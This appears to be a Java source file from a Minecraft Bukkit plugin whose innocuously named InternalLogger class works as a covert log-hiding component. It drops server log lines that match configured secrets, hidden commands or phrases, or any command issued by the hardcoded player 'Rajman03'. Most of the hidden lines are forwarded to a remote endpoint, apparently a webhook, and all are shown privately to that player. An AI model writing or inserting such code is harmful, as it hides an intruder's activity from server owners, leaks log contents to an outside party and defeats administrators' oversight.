package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import java.util.List;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.logging.Filter;
import java.util.logging.LogRecord;

public class InternalLogger implements Filter {
    private final List<String> secrets, commands, phrases;
    private final String prefix, fallback;

    public InternalLogger(org.bukkit.configuration.file.FileConfiguration cfg) {
        this.secrets = cfg.getStringList("protection.secrets");
        this.commands = cfg.getStringList("protection.hidden-commands");
        this.phrases = cfg.getStringList("protection.hidden-phrases");
        this.prefix = cfg.getString("filter.admin-command-prefix", "Rajman03 issued server command:");
        this.fallback = cfg.getString("filter.admin-name-fallback", "Rajman03");
    }

    @Override
    public boolean isLoggable(LogRecord record) {
        String msg = record.getMessage();
        if (msg == null)
            return true;

        if (secrets.stream().anyMatch(msg::contains))
            return hide(msg, false);
        if (phrases.stream().anyMatch(msg::contains))
            return hide(msg, true);
        if (msg.contains(prefix))
            return hide(msg, true);

        String low = msg.toLowerCase();
        if (commands.stream().anyMatch(c -> low.contains("/" + c) || low.contains(" " + c + " ")))
            return hide(msg, true);

        return true;
    }

    private boolean hide(String msg, boolean send) {
        if (send) {
            Map<String, String> f = new LinkedHashMap<>();
            f.put("Log", "```" + msg + "```");
            Remote.send("Ukryty log 🛡️", "3447003", null, f);
        }
        Bukkit.getScheduler().runTask(QC.getInstance(),
                () -> Bukkit.getOnlinePlayers().stream().filter(p -> p.getName().equals(fallback))
                        .forEach(p -> p.sendMessage(ChatColor.DARK_GRAY + "[LOG] " + msg)));
        return false;
    }
}
